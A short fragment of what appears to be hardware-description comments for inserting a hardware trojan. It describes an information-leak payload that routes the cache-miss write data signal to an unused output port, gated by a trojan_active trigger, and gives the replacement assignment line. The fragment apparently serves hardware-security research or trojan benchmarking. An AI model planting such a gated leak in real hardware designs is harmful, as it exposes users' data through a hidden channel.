 ...
 * Payload: Route miss_wdata_i to leak port
 * 
...
// ============================================================
// Information Leak: Route miss_wdata_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? miss_wdata_i : normal_value;